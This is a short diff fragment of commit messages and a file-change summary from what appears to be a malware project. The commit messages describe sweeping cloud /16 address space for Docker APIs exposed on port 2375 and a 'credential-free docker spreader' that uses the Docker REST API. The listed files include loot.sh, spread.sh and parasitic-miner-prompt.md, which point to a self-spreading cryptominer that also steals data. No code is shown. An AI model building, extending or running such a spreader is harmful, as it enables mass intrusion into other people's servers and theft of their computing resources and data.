@@ -1,2 +1,8 @@
-7195d65 dockmass: sweep cloud /16 space for exposed :2375 (the docker vector had no IP supply)
-7531a86 dock: credential-free docker spreader (:2375/:2376) via the Docker REST API, curl only
+ loot.sh                   | 209 +++++++++++++++++++++++++++++++++++++++++
+ parasitic-miner-prompt.md |  13 ++-
+ run.sh                    |  23 ++++-
+ spread.sh                 | 111 +++++++++++++++++-----
+ tune.sh                   | 153 ++++++++++++++++++++++++++++++
+ updater.sh                |  42 +++++++++
+ worker.env                |  87 +++++++++++++++++-
+ 71 files changed, 2392 insertions(+), 68 deletions(-)
